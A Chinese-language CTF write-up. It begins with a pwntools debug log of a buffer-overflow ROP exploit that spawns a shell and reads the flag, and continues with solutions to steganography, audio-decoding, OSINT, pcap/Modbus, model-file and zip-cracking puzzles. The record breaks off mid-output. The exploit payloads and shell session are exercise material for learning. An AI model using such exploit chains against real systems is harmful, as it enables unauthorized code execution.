    b'The operator left years ago;\n'
    b'the board still places any call,\n'
    b'if you ask it the right way.\n'
[DEBUG] Received 0x9d bytes:
    b'  ... only the dial tone hums through the empty exchange.\n'
    b'(When feel alone)\n'
    b'(Just call my name)\n'
    b'I will hear your voice -- leave your message after the tone.\n'
[*] sending payload: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAT\x12@\x00\x00\x00\x00\x00\xf0\x00\x00\x00\x00\x00\x00\x00\x90\x10@\x00\x00\x00\x00\x00'
[DEBUG] Sent 0x70 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000050  41 41 41 41  41 41 41 41  54 12 40 00  00 00 00 00  │AAAA│AAAA│T·@·│····│
    00000060  f0 00 00 00  00 00 00 00  90 10 40 00  00 00 00 00  │····│····│··@·│····│
    00000070
[+] payload sent
[*] sending payload: b'\x1a\x10@\x00\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00R\x12@\x00\x00\x00\x00\x00H@@\x00\x00\x00\x00\x00\x90\x10@\x00\x00\x00\x00\x00P\x12@\x00\x00\x00\x00\x00H@@\x00\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00\x80\x10@\x00\x00\x00\x00\x00CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC'
[DEBUG] Sent 0xf0 bytes:
    00000000  1a 10 40 00  00 00 00 00  1a 10 40 00  00 00 00 00  │··@·│····│··@·│····│
    *
    00000070  52 12 40 00  00 00 00 00  48 40 40 00  00 00 00 00  │R·@·│····│H@@·│····│
    00000080  90 10 40 00  00 00 00 00  50 12 40 00  00 00 00 00  │··@·│····│P·@·│····│
    00000090  48 40 40 00  00 00 00 00  1a 10 40 00  00 00 00 00  │H@@·│····│··@·│····│
    000000a0  80 10 40 00  00 00 00 00  43 43 43 43  43 43 43 43  │··@·│····│CCCC│CCCC│
    000000b0  43 43 43 43  43 43 43 43  43 43 43 43  43 43 43 43  │CCCC│CCCC│CCCC│CCCC│
    *
    000000f0
[+] payload sent
[*] sending payload: b'/bin/sh\x00'
[DEBUG] Sent 0x8 bytes:
    00000000  2f 62 69 6e  2f 73 68 00                            │/bin│/sh·│
    00000008
[+] payload sent
[*] try to interactive with target...
[*] Switching to interactive mode

$ ls /
[DEBUG] Sent 0x5 bytes:
    b'ls /\n'
[DEBUG] Received 0x67 bytes:
    b'bin\n'
    b'boot\n'
    b'dev\n'
    b'etc\n'
    b'flag\n'
    b'home\n'
    b'lib\n'
    b'lib32\n'
    b'lib64\n'
    b'libx32\n'
    b'media\n'
    b'mnt\n'
    b'opt\n'
    b'proc\n'
    b'root\n'
    b'run\n'
    b'sbin\n'
    b'srv\n'
    b'sys\n'
    b'tmp\n'
    b'usr\n'
    b'var\n'
bin
boot
dev
etc
flag
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cat /flag
[DEBUG] Sent 0xa bytes:
    b'cat /flag\n'
[DEBUG] Received 0x37 bytes:
    b'flag{ju5T-CAL1-My-NAme_4nD-1-w1ll_H3AR_yOur_vOIC335b3}\n'
flag{ju5T-CAL1-My-NAme_4nD-1-w1ll_H3AR_yOur_vOIC335b3}
$
```

```txt
flag{ju5T-CAL1-My-NAme_4nD-1-w1ll_H3AR_yOur_vOIC335b3}
```

## Misc

### MISSION 03 「无线电社团的怪信号」

```txt
阿尼亚在伊甸学园无线电社团帮忙整理旧设备，学长从一台老式接收机里截获了一段信号。那声音里，有频率缓慢滑动的尖响，像老式调制解调器在拨号，有电话按键被按下时那种音调固定的短音，还有几段忽长忽短、像谁在轻轻敲着什么的声响。阿尼亚听不懂，但她觉得这段声音里藏了好几件事。
```

#### Track 1 SSTV

明显的 SSTV，直接在线解码：

![](https://img.halfcity.top/2026/11/11/4393d2d9ea1f46be6545511a87c6ac2e.avif)

```txt
flag{inside_t#e_Club_@nya_heard_ssTu_on_7he_radio_
```

#### Track 2 Morse

摩斯密码，记录一下：

```txt
- - - / -- --- .-. ... . / ..-. .-. --- -- / .- / - . .-.. . --. .-. .- .--. .... / - - -
```

解码为 `MORSE FROM A TELEGRAPH` 并按照上一张图片内容写成这种形式：

```txt
MORSE-FROM-A-TELEGRAPH
```

#### Track 3 DTMF

第三部分是 DTMF，在线解析一下：

```txt
0054s .............999..555###.
0055s ..999..777###...111..111.
0056s ..000###..666...888###..9
0057s 99...555###..111...000..000
0058s 00###...111..111...666###
0059s ..111...000..999###...111
0060s ..000...222###..999...555
0061s ###..111...111..111###...00
0062s 111..111...000###..999...00
0063s 555###..999...777###..999
0064s ...555###..111...000..777
0065s ###...111..000...111###..00
0066s 888...999###..111...111..00
0067s 222###...666..444###...11
0068s 1..000...000###..111...22
0069s 2..555
```

```txt
95#97#110#68#95#100#116#109#102#95#111#110#95#97#95#107#101#89#112#64#100#125
```

将 `#` 作为分隔符，其他部分解码为 ASCII：

```txt
_anD_dtmf_on_a_keYp@d}
```

```txt
flag{inside_t#e_Club_@nya_heard_ssTu_on_7he_radio_MORSE-FROM-A-TELEGRAPH_anD_dtmf_on_a_keYp@d}
```

### MISSION 04 「贝姬的闺蜜密信」

```txt
肩書きの上で 踊るシルエット 本音は胸ポッケに仕舞っておこう 疎らな足音 リズムを崩されるような そんなノイズも心地良い ドタバタな日々を チグハグな歩幅で歩いていく 繋いだ手の平に 確かに感じる温もり 誰もが着飾り踊るアクター それでも何処か 君と僕の会話の隙間 見え隠れしている 想いは投げ合うほどに 安堵する不思議 いつか終わるこんな日々だけど 今はまだ このハチャメチャで 歪な僕らの 明日を願っている 陽が落ちる頃 ぼやけるシルエット 別の顔を纏って夜を駆ける 完璧にみせた 不可能はまるでないような そんな理想を追いかけて クタクタに疲れて デコボコに擦り減る心を 繋ぎ止める光は 何時かの僕との約束 見上げた空を満たすステラ その一つ一つが 違う記憶 抱えて浮かぶ孤独な瞬き 胸に秘めた君の心の内 読み解けたのなら なんて悩む日もあるけれど すれ違いながら 不揃いな心でも向き合っていたいんだ 見えないものに愛は潜んでいる 誰もが 誰にも見せない 顔を隠してる それは大事な人を想う 優しさの証 誰もが着飾り踊るアクター それでも僕ら 手と手を繋ぎ今日も描く まだ見ぬストーリー 揺るがない想いはいつしか シナリオを越える いつか終わるこんな日々だから 今はただ このハチャメチャで 歪な世界を 華麗に舞い踊る 
```


#### Track 1 零宽字符隐写

文件里可见内容是一段 base64，其中混着两种零宽字符：U+200B（ZWSP）748 个、U+200D（ZWJ）276 个，恰好共 1024 个 = 128 字节。按出现顺序把它们当作二进制流（ZWSP=0、ZWJ=1），每 8 位一个字节，得到的是 UTF-16BE 编码的文本：

```txt
part1:flag{wakuwaku_you_know-zero_w!dth-ChaRact3r_stegan0graphy_
```

#### Track 4 base64 填充位隐写

以 _ 结尾提示还有后半段，藏在可见 base64 本身。把零宽字符剔除后，57 行 base64 解码出来是一段日文歌词，但每行都以空格结尾，且结尾字符各不相同——IG==、IH==、IK==、ID=……这些末尾字符的低 4 位或低 2 位并不影响解码结果，属于自由位。

按行序提取全部 228 个自由位，重组为 28 字节：

```txt
part2:and_b64_paddlng_stego}
```

两段拼接即为最终 flag。

完整解密脚本：

```py
import base64
import re
import sys

ZW = '\u200b\u200d'  # ZWSP / ZWJ
B64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'


def part1_zero_width(text: str) -> str:
    # 按出现顺序: ZWSP=0, ZWJ=1 -> 比特流 -> 字节 -> UTF-16BE
    bits = ''.join('0' if c == '\u200b' else '1' for c in text if c in ZW)
    bs = bytes(int(bits[i:i + 8], 2) for i in range(0, len(bits) // 8 * 8, 8))
    return bs.decode('utf-16-be')


def part2_b64_padding(text: str) -> str:
    # 剔除零宽字符后, 每行base64末字符的低自由位(2个'='有4位, 1个'='有2位)
    bits = ''
    for line in text.splitlines():
        b64 = re.sub(f'[{ZW}]', '', line).strip()
        if not b64:
            continue
        core = b64.rstrip('=')
        npad = len(b64) - len(core)
        free = B64.index(core[-1]) & (0xF if npad == 2 else 0x3)
        bits += format(free, '04b' if npad == 2 else '02b')
    bs = bytes(int(bits[i:i + 8], 2) for i in range(0, len(bits) // 8 * 8, 8))
    return bs.decode('ascii')


def main():
    text = open(sys.argv[1], encoding='utf-8').read()
    p1 = part1_zero_width(text)
    p2 = part2_b64_padding(text)
    print(p1)
    print(p2)
    flag = p1.split(':', 1)[1] + p2.split(':', 1)[1]
    print('FLAG:', flag)


if __name__ == '__main__':
    main()
```

```bash
> python codex.py attachment_32286f.txt
part1:flag{wakuwaku_you_know-zero_w!dth-ChaRact3r_stegan0graphy_
part2:and_b64_paddlng_stego}
FLAG: flag{wakuwaku_you_know-zero_w!dth-ChaRact3r_stegan0graphy_and_b64_paddlng_stego}
```

```txt
flag{wakuwaku_you_know-zero_w!dth-ChaRact3r_stegan0graphy_and_b64_paddlng_stego}
```

### OSINT之旅2

db349b97c37d22f5ea1d1841e3c89eb4

可以看到这是著名的勒索病毒 WannaCry，也是永恒之蓝的成名之战。

这里的检测率也是高的吓人，到了 68 / 70 远超 msf 生成的马的 28 / 70。

```txt
flag{家族名称_漏洞利用工具名称_微软安全公告编号_公告首次发布日期}
```

家族名称：wannacry

漏洞利用工具名称：eternalblue

微软安全公告编号：ms17-010

这三个想必都烂熟于心了，但是具体时间还真不太清楚。

从这里可以看到微软的安全公告以及漏洞补丁：

![](https://img.halfcity.top/2026/11/11/60ceca8b2af576997564eeae44ca4725.avif)

公告首次发布日期是 2017年3月14日。

我们将信息按要求拼接成 flag 即可：

```txt
flag{wannacry_eternalblue_ms17-010_20170314}
```

### OSINT之旅3

![](https://img.halfcity.top/2026/11/11/ed58fe0982545d06a653a6d77f9aad9b.avif)

```txt
众所周知，美国大兵始终秉持着“秘密是国家的，粉丝是自己的”的原则 小军在B站上发现了一段视频，他截了一张美国大兵驾驶F16刚起飞时的关键帧给你，截图里有一个关键的地点(截图左下角)，最后小军在油管进行关键词搜索，找到了原博主和该基地官方的共创视频，又在该博主的近两个月视频中找到了大量体验F16的视频，小军发现都是博主与同一位飞行员的视频。当然B站也是可以找到油管上的原始视频的。

你的任务 1.你找到截图左下角这个场地的联系电话。如+1 114-514-1919记为+1_114-514-1919 2.美国大兵所在的基地名称。如Chang Shui Base -> 记为Chang_Shui_Base 3.请你找到这位飞行员隶属的中队(squadron)编号

flag最后是flag{场地电话_基地名称_中队编号} flag格式：flag{+1_114-514-1919_Joint_Base_Pearl_Harbor_Hickam_111}
```

题目是一张战斗机座舱的图片。

我们先将图片交给 AI 快速定位一下是否有直接的公开信息：

![](https://img.halfcity.top/2026/11/11/f5b50f29961c73226bb0d29f97dd0aae.avif)

![](https://img.halfcity.top/2026/11/11/d6b630d563fdeb70b22ebe3b6e16f963.avif)

沿着 AI 说的 BV 号去找确实发现了一个视频，几乎和图片中说的一模一样。

虽然这个大概率不是原视频，但是我们可以根据标题和简介定位到这是爱德华兹空军基地的第 416 飞行测试中队。

给出的图片是在低空，可能是刚离场并在爬升的阶段，所以这里应该不会离基地太远。

左下角细看一下蜿蜒成这样的应该是赛道，所以这应该是某一个 `赛车场 / 试车场 / 汽车公园 `

接下来没啥好说的了，让 AI 批量找出所有在基地周围的类似设施，然后人工使用谷歌地球一个个看。

这个地方最突出的特征就是大跑道包小跑道，同时小跑道还有一个和鸟一样突出的头部。

最后我定位到了这个地方：

```txt
Hyundai Motor Group California Proving Ground, California 58, California City, 加利福尼亚美国
```

![](https://img.halfcity.top/2026/11/11/cd6bbe247aafc33a2c3d9505087fe1cd.avif)

我们稍微转动一下视角来拟合图片：

![](https://img.halfcity.top/2026/11/11/c1ea31a69afeb7a055e395a0ecf581d8.avif)

可以看到这里的左下角和题目中的几乎一致。

电话也已经由谷歌地球给出：`+1 949-790-5500`。

根据格式将收集到的信息拼接成 flag 即可：

```txt
flag{+1_949-790-5500_Edwards_Air_Force_Base_416}
```

### 零点广播 01：谁替我发了通知

```txt
你拿到了网关在事发前后的网络抓包。请定位 正式实验室 ECHO 中，署名 mrsh、声称归档维护完成且原目录已清理的那条通知，查明实际发送它的主机 IPv4 地址，并恢复该次通知对应的回执编号 receipt_id

提交格式：flag{源IPv4地址_回执编号}
```

这里先尝试直接搜索名字，找到了很多请求：

![](https://img.halfcity.top/2026/11/11/0e62286564d8a8219157d9c765e3edcc.avif)

其中我们还找到了不少关键词，我们将关键词加上再搜索试试：

![](https://img.halfcity.top/2026/11/11/9226f2fb21db571510b75c2a3bc2380a.avif)

一个个排查看请求体，看到有很多几乎一样的响应，但是其中有一个响应看起来与众不同。

我们追踪流看一下：

![](https://img.halfcity.top/2026/11/11/3d6ae49deca7a9e959280a90ac7c47b1.avif)

这里我们得到了源 IP `172.30.52.10`。

注意到这里返回了一个存档文件，我们使用 Wireshark 导出并解压。

然后可以在一个 receipt.json 中看到以下内容：

```json
{
  "event_id": "ECHO-0042",
  "receipt_id": "J93TEDB03IO0",
  "operator": "mrsh",
  "action": "archive_cleanup",
  "result": "accepted",
  "lab": "ECHO"
}
```

这里我们可以得到 receipt_id 为 `J93TEDB03IO0`。

```txt
flag{172.30.52.10_J93TEDB03IO0}
```

### 遇到隐写要拿出真本事

```txt
鲁迪乌斯转生到了陌生的远方。他把一句绝不能忘记的誓言拆成三段，藏在了旅途中的三个有关“转折点”的记忆里：一张与艾莉丝有关的照片、一段洛琪希录下的奇怪声音，以及一篇希露菲所写的书信……它们真的只是普通文件吗？ 请帮助鲁迪乌斯找回三段记忆，按照旅途的顺序将它们拼接起来。
```

#### Track 1 steghide

里面有一个提示文件：

```txt
艾莉丝把第一段记忆藏进了照片，但肉眼可看不出来。
JPEG 图片里也能藏文件；试试使用 steghide 检查并提取它吧。
（这部分没有设置密码，提取出的内容还需要再做一次常见编码解码）
```

根据提示我们直接提取文件即可：

```bash
❯ steghide extract -sf part1.jpg
Enter passphrase:
wrote extracted data to "flag1.txt".

❯ cat flag1.txt
ZmxhZ3tMMXYzXw==%    

❯ echo ZmxhZ3tMMXYzXw==|base64 -d
flag{L1v3_
```

```txt
flag{L1v3_
```

#### Track 2 频谱图隐写

里面还是有一个提示文件：

```txt
洛奇希师父教过：有些咏唱不是用来“听”的，而是用来“看”的。
好像要看看频谱图？
```

直接告诉我看频谱图了，那我肯定是要听话去看的：

![](https://img.halfcity.top/2026/11/11/0eae2ed089b2cae1da83d24f4f3dc02b.avif)

```txt
Th1s_L1f3_
```

#### Track 3 Snow 隐写

依旧有提示，出题人最良心的一题：

```txt
这是希露菲寄来的信。北境的雪没有盖住文字，却悄悄落在了每一行的末尾。
```

直接明示了 snow 隐写，直接提取即可：

```bash
❯ stegsnow -C part3.txt
S3ri0usly}
```

```txt
S3ri0usly}
```

最后的 flag：

```txt
flag{L1v3_Th1s_L1f3_S3ri0usly}
```

### 零点广播 02：空无一人的控制室

```txt
请确定捕获区间内 ECHO 正式单元第一次成功启动播报的写入请求，提取其事务ID，并恢复该次启动的完整播报文本

提交格式：flag{事务ID_播报内容}
```

打开一看可以观察到一些 http 请求和大量的 modbus 通信。

所以这应该是一个 ICS 环境，因为有大量的 PLC 通信。

随便看看 http 请求，我们希望可以找到具体通信的协议内容。

这里找到了一个请求，它似乎返回了通信协议的细节：

```json
GET /api/panel-config HTTP/1.1
Accept-Encoding: identity
User-Agent: ECHO-Panel/1.0
Host: echo-panel
Connection: close

HTTP/1.1 200 OK
Server: EchoPanel/1.0 
Date: Fri, 02 Oct 2026 07:37:34 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 2084
Connection: close
Cache-Control: no-store

{
  "schema": "echo.panel-layout",
  "panel": {
    "title": "ECHO ............",
    "profile": "text-broadcast"
  },
  "driver": {
    "protocol": "modbus-tcp",
    "register_area": "holding",
    "address_base": 0
  },
  "channels": [
    {
      "unit_id": 1,
      "label": "ECHO"
    },
    {
      "unit_id": 2,
      "label": "ECHO-PREVIEW"
    }
  ],
  "tags": {
    "brightness": {
      "address": 1,
      "type": "uint16",
      "access": "rw"
    },
    "display_page": {
      "address": 2,
      "type": "uint16",
      "access": "rw"
    },
    "play_command": {
      "address": 16,
      "type": "uint16",
      "access": "rw"
    },
    "play_state": {
      "address": 17,
      "type": "uint16",
      "access": "ro"
    },
    "start_count": {
      "address": 18,
      "type": "uint16",
      "access": "ro"
    },
    "draft_length": {
      "address": 240,
      "type": "uint16",
      "access": "rw",
      "unit": "bytes"
    },
    "draft_text": {
      "address": 256,
      "registers": 32,
      "type": "string",
      "access": "rw",
      "encoding": "ASCII",
      "byte_order": "high-byte-first",
      "length_tag": "draft_length"
    }
  },
  "ui": {
    "brightness": {
      "tag": "brightness",
      "label": "............",
      "minimum": 0,
      "maximum": 100
    },
    "page_selector": {
      "tag": "display_page",
      "options": {
        "0": "............",
        "1": "............"
      }
    },
    "status": {
      "tag": "play_state",
      "labels": {
        "0": "......",
        "1": "........."
      }
    },
    "counter": {
      "tag": "start_count",
      "label": "............"
    },
    "editor": {
      "tag": "draft_text",
      "label": "............",
      "max_bytes": 64
    },
    "actions": {
      "start": {
        "label": "......",
        "tag": "play_command",
        "value": 1
      },
      "stop": {
        "label": "......",
        "tag": "play_command",
        "value": 0
      }
    },
    "help": ".................................................................."
  }
}
```

可能这是给 HMI 提供的接口？

我们简单解读一下：

- 我们需要的 channel `ECHO` 的 unit_id 为 1
- 提供的这片区域的寄存器是保持寄存器
- `play_command` 寄存器的地址是 16
- 地址 240 是文本长度
- 地址 256 以后是文本

据此我们可以过滤出对这些寄存器的操作。

首先先找找对目标寄存器的写操作：

![](https://img.halfcity.top/2026/11/11/094c3016ccf499755c4b23d15bb9f263.avif)

这里要的是第一次启动，所以事务ID就是 `8961`。

随后我们可以过滤出对文本寄存器区域的写操作：

![](https://img.halfcity.top/2026/11/11/5ca0cd53f533cd3cb68cee27a7aab3c9.avif)

数量不多，接下来一个个检查写了什么东西。

去掉那个一堆 `XXX` 其中可读的文本如下：

```txt
ECHO_SYSTEM_READY

r_yOu_7or_

l'v3_b33n_

@_I0ng_t1m3

w41tXX9_f0

in
```

直接连起来提交发现不对，思考一下它的写操作可能不是顺次的，所以我们需要再检查一下写寄存器的顺序以及长度寄存器的值。

不过我就懒得去看了，这里的 `ECHO_SYSTEM_READY` 应该不是 flag 的一部分，因为风格差异过大。

剩下的根据语意排列组合一下就能得到 flag。

大意为，我早已等候多时。

```txt
flag{8961_l'v3_b33n_w41tin9_f0r_yOu_7or_@_I0ng_t1m3}
```

### AEGIS-MODEL

pth 文件的本质是 zip 文件。

我们解压可以看到一个 hint 图片：

![](https://img.halfcity.top/2026/11/11/4d4ce1dd494c741c5bf7b34424923320.avif)

这是一个路径评分函数 带转移代价的序列对齐 / Viterbi。

我们使用 pytorch 提取一下基础的信息：

```json
meta = {
    'dim': 32,
    'token_count': 65,
    'token_format': 'base64',
    'alphabet': 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=',
    'path_weight': 0.8,          # λ
    'build': 'aegis-memory-bank-20501003'
}

state = {
    'embedding.weight': [65, 32],   # e_k，65 个 base64 字符的 embedding
    'target_bank':      [44, 32],   # t_0 ... t_43，观测序列
    'transition':       [65, 65],   # T 转移代价矩阵
    'auxiliary':        [6, 32]     # 备用，本任务未用到
}
```

我们的目标应该是是找使 Score 最小 的路径 $P$（$d_1$​ 用 L1 或 L2 结果相同）

这里的 pth 文件不是标准的格式，我们转化一下并求解最短路径：

```py
import zipfile
from pathlib import Path
import torch
import numpy as np
import base64
import tempfile

def load_model(pth_path):
    with tempfile.TemporaryDirectory() as tmp:
        with zipfile.ZipFile(pth_path) as zf:
            zf.extractall(tmp)
        model_dir = Path(tmp) / "model2" / "model"
        fixed = Path(tmp) / "fixed.pth"
        with zipfile.ZipFile(fixed, "w") as zf:
            for p in model_dir.rglob("*"):
                if p.is_file():
                    zf.write(p, "archive/" + str(p.relative_to(model_dir)))
        return torch.load(fixed, map_location="cpu", weights_only=False)

def viterbi(tb, emb, trans, lam, dist_fn):
    n, K = tb.shape[0], emb.shape[0]
    dp = np.full((n, K), np.inf)
    prev = np.full((n, K), -1, dtype=int)
    for k in range(K):
        dp[0, k] = dist_fn(tb[0], emb[k])
    for i in range(1, n):
        for k in range(K):
            costs = dp[i - 1] + lam * trans[:, k]
            best = np.argmin(costs)
            dp[i, k] = costs[best] + dist_fn(tb[i], emb[k])
            prev[i, k] = best
    path = []
    k = int(np.argmin(dp[-1]))
    for i in range(n - 1, -1, -1):
        path.append(k)
        k = prev[i, k]
    return path[::-1]

data = load_model("model.pth")
state, meta = data["state"], data["meta"]
emb   = state["embedding.weight"].numpy()
tb    = state["target_bank"].numpy()
trans = state["transition"].numpy()
lam   = meta["path_weight"]
alphabet = meta["alphabet"]

def L1(a, b):
    return np.abs(a - b).sum()

path = viterbi(tb, emb, trans, lam, L1)
token_str = "".join(alphabet[i] for i in path)
print(f"Path (base64)        = {token_str}")

decoded = base64.b64decode(token_str)
print(f"Decoded bytes (hex)  = {decoded.hex()}")
print(f"Decoded string       = {decoded.decode()}")
```

输出如下：

```txt
> python solution.py
Path (base64)        = ZgoNBhwsZAJWD19oDWFeXn51C0FWe2hfW2xoRQdCfzU=
Decoded bytes (hex)  = 660a0d061c2c6402560f5f680d615e5e7e750b41567b685f5b6c684507427f35
Decoded string       = f
a^^~u
     AV{h_[lhEB5
```

得到了 Path： `ZgoNBhwsZAJWD19oDWFeXn51C0FWe2hfW2xoRQdCfzU=`。

但似乎 base64 解码后是乱码，可能有一层加密？

但是我们没有任何有关加密算法的信息，也没有密钥，但是平心而论得到如此标准的结果不太可能是答案错误，所以加密应该是简单的加密。

这里我们注意到解码的第一个字符是 f，正好是 flag 的开头。

`f ^ 0x00 = f`，所以可能这是一个流式异或加密并且初始密钥就是 0x00。

事实证明确实如此。

最后我们得到完整的解密脚本：

```py
import zipfile
from pathlib import Path
import torch
import numpy as np
import base64
import tempfile

def load_model(pth_path):
    with tempfile.TemporaryDirectory() as tmp:
        with zipfile.ZipFile(pth_path) as zf:
            zf.extractall(tmp)
        model_dir = Path(tmp) / "model2" / "model"
        fixed = Path(tmp) / "fixed.pth"
        with zipfile.ZipFile(fixed, "w") as zf:
            for p in model_dir.rglob("*"):
                if p.is_file():
                    zf.write(p, "archive/" + str(p.relative_to(model_dir)))
        return torch.load(fixed, map_location="cpu", weights_only=False)

def viterbi(tb, emb, trans, lam, dist_fn):
    n, K = tb.shape[0], emb.shape[0]
    dp = np.full((n, K), np.inf)
    prev = np.full((n, K), -1, dtype=int)
    for k in range(K):
        dp[0, k] = dist_fn(tb[0], emb[k])
    for i in range(1, n):
        for k in range(K):
            costs = dp[i - 1] + lam * trans[:, k]
            best = np.argmin(costs)
            dp[i, k] = costs[best] + dist_fn(tb[i], emb[k])
            prev[i, k] = best
    path = []
    k = int(np.argmin(dp[-1]))
    for i in range(n - 1, -1, -1):
        path.append(k)
        k = prev[i, k]
    return path[::-1]

data = load_model("model.pth")
state, meta = data["state"], data["meta"]
emb   = state["embedding.weight"].numpy()
tb    = state["target_bank"].numpy()
trans = state["transition"].numpy()
lam   = meta["path_weight"]
alphabet = meta["alphabet"]

def L1(a, b):
    return np.abs(a - b).sum()

path = viterbi(tb, emb, trans, lam, L1)
token_str = "".join(alphabet[i] for i in path)
print(f"Path (base64)        = {token_str}")

decoded = base64.b64decode(token_str)
print(f"Decoded bytes (hex)  = {decoded.hex()}")

flag_chars = []
prev = 0
for b in decoded:
    c = b ^ prev
    flag_chars.append(c)
    prev = c

flag_bytes = bytes(flag_chars)
print(f"FLAG: {flag_bytes.decode('ascii', errors='replace')}")
```

输出如下：

```txt
> python solution.py
Path (base64)        = ZgoNBhwsZAJWD19oDWFeXn51C0FWe2hfW2xoRQdCfzU=
Decoded bytes (hex)  = 660a0d061c2c6402560f5f680d615e5e7e750b41567b685f5b6c684507427f35
FLAG: flag{W31gh7_R3m3M83r$_7h3_7ru7H}
```

```txt
flag{W31gh7_R3m3M83r$_7h3_7ru7H}
```

### 你爱压缩包

最麻烦的题目，共 11 层嵌套考题。

#### Track 1 伪加密

试图解压发现需要密码，但是我们什么都没有啊。

猜测是伪密码，尝试使用工具解压：

```txt
> python ZipCracker.py challenge123.zip

     ______          ____                _   [*]Hx0战队
    |__  (_)_ __    / ___|_ __ __ _  ___| | _____ _ __
      / /| | '_ \  | |   | '__/ _ |/ __| |/ / _ \ '__|
     / /_| | |_) | | |___| | | (_| | (__|   <  __/ |
    /____|_| .__/___\____|_|  \__,_|\___|_|\_\___|_|
           |_| |_____|
    #Coded By Asaotomo         Update:2026.05.25 (Core Engine Refactor)

[10:00:54] [!] 未检测到 pyzipper。当前系统: Windows 11 (10.0.26200) / x86_64
[10:00:54] [*] 当前压缩包未检测到明显的 AES 标记；如果只是传统 ZipCrypto，可以选择跳过安装。
[10:00:54] [*] 安装方式1: 当前 Python 环境安装（推荐，中文模式优先清华源）: D:\data\env\python\Python314\python.exe -m pip install pyzipper -i https://pypi.tuna.tsinghua.edu.cn/simple
[10:00:54] [*] 安装方式2: 当前 Python 环境安装（官方源）: D:\data\env\python\Python314\python.exe -m pip install pyzipper
[10:00:54] [*] 安装方式3: 通用命令: py -m pip install pyzipper
[10:00:54] [*] 安装方式4: 若无管理员权限，可尝试用户级安装: D:\data\env\python\Python314\python.exe -m pip install --user pyzipper
[10:00:54] [?] 是否现在执行 pyzipper 一键自动安装？输入 n 可跳过继续当前任务。 (y/n): y
[10:01:18] [*] 开始执行 pyzipper 一键自动安装...
[10:01:18] [*] 中文模式优先使用清华 PyPI 镜像安装 pyzipper: https://pypi.tuna.tsinghua.edu.cn/simple
[10:01:20] [!] 通过清华 PyPI 镜像安装 pyzipper 失败，正在自动回退到官方 PyPI...
[10:01:24] [!] pyzipper 一键自动安装失败: 安装完成，但当前进程未能导入 pyzipper。
[10:01:24] [*] 已跳过 pyzipper 安装，继续当前任务。
[10:01:24] [*] 当前仍未启用 pyzipper，因此如果目标条目使用 AES，加密验证或解压可能无法正常完成。
[10:01:24] [!] 系统检测到 challenge123.zip 的加密标志位已开启，正在尝试进行伪加密修复...
[10:01:24] [*] 伪加密修复成功！文件 'challenge123.zip' 无需密码。
[10:01:24] [*] 系统已为您自动提取出 2 个文件到 'unzipped_files' 文件夹中: ['1000.zip', 'README.txt']
```

得到 `1000.zip` 和 `README.txt` 进入下一关。

#### Track 2 套娃压缩包

1000.zip 解压后是 999.zip。

写一个脚本循环解压然后递归删除就的即可。

```py
import zipfile, os, glob

WORK = r".\"
SRC  = os.path.join(WORK, "1000.zip")

os.makedirs(WORK, exist_ok=True)

while True:
    zips = glob.glob(os.path.join(WORK, "*.zip"))
    if not zips:
        break

    zpath = zips[0]
    print(f"解压: {os.path.basename(zpath)}")
    
    with zipfile.ZipFile(zpath) as zf:
        zf.extractall(WORK)
    
    os.remove(zpath)
```

当然使用 ZipCracker 也可。

最后得到 `riddle.zip` 和 `mask.zip` 两个文件。

#### Track 3 CRC 爆破

观察到 riddle.zip 中有很多四字节文件，可以直接利用明文的 CRC 爆破具体的明文。

```py
import zipfile, zlib

def crc32_inv(target: int) -> bytes:
    c0 = zlib.crc32(b'\x00' * 4) & 0xFFFFFFFF
    # 列向量：单比特消息的 L 像
    cols = [(zlib.crc32((1 << i).to_bytes(4, 'little')) & 0xFFFFFFFF) ^ c0 for i in range(32)]
    t = target ^ c0
    # 增广矩阵：第 i 行 = [各列的第 i 位 | t 的第 i 位]
    A = [sum(((cols[j] >> i) & 1) << j for j in range(32)) | ((t >> i) & 1) << 32 for i in range(32)]
    # 高斯消元
    piv, r = [], 0
    for c in range(32):
        p = next((k for k in range(r, 32) if (A[k] >> c) & 1), None)
        if p is None:
            continue
        A[r], A[p] = A[p], A[r]
        piv.append(c); r += 1
        for k in range(32):
            if k != r - 1 and (A[k] >> c) & 1:
                A[k] ^= A[r - 1]
    if r < 32:
        raise ValueError('CRC 不可逆')
    x = 0
    for ri, c in enumerate(piv):
        if (A[ri] >> 32) & 1:
            x |= 1 << c
    return x.to_bytes(4, 'little')

if __name__ == '__main__':
    z = zipfile.ZipFile('file.zip')
    parts = []
    for info in sorted(z.infolist(), key=lambda i: i.filename):
        m = crc32_inv(info.CRC)
        assert zlib.crc32(m) & 0xFFFFFFFF == info.CRC   # 自校验
        parts.append(m)
        print(info.filename, m)
    plain = b''.join(parts)
    open('plain.txt', 'wb').write(plain)
    print('\n==== 拼接结果 ====')
    print(plain.decode())
```

输出如下：

```txt
>python crack_riddle_crc.py
01.txt b'PASS'
02.txt b'WORD'
03.txt b'=?d?'
04.txt b'd?d?'
05.txt b'd?d?'
06.txt b'd?d?'
07.txt b'd?d?'
08.txt b'd?d?'
09.txt b'd?d?'
10.txt b'd?d?'
11.txt b'd?d?'
12.txt b'd?d?'
13.txt b'd;D3'
14.txt b'=6;D'
15.txt b'15+D'
16.txt b'3=6;'
17.txt b'D7=('
18.txt b'D15+'
